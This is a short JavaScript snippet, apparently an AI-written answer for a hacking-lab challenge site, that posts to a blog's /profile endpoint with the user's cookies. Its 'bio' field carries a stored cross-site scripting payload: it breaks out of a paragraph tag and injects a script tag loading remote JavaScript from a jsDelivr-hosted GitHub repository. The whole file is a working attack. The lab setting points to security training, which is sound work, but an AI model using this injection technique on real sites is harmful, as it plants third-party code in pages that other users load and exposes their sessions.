// === POST /profile from the browser, sending same-origin cookies ===
(async () => {
  const url = "https://chl-7308acb4-20c3-4120-9c1b-66a116c133ab-blog-hacklab-v2.softwareseguro.com.ar/profile";

  // The bio contains the script tag you provided.
  // Use template literal to avoid escaping headaches.
  const bioHtml = `</p><script src="https://cdn.jsdelivr.net/gh/EliasMouesca/xss@main/sw_seguro/comment.js"></script><p>`;

  // Build multipart/form-data using FormData. Do NOT set Content-Type manually.
  const form = new FormData();
  form.append("bio", bioHtml);

  // Your example had an empty file for profile_pic. We recreate that:
  // append(name, blob, filename). Use an empty blob and an empty filename (matches your request).
  form.append("profile_pic", new Blob([], { type: "application/octet-stream" }), "");

  try {
    const res = await fetch(url, {
      method: "POST",
      body: form,
      // important: include same-origin cookies (also sends HttpOnly cookies)
      credentials: "same-origin",
      // Don't set headers["Content-Type"] — the browser will set the boundary for multipart automatically
    });

    const text = await res.text();
    console.log("Status:", res.status);
    console.log("Response body:", text);
  } catch (err) {
    console.error("Fetch error:", err);
  }
})();
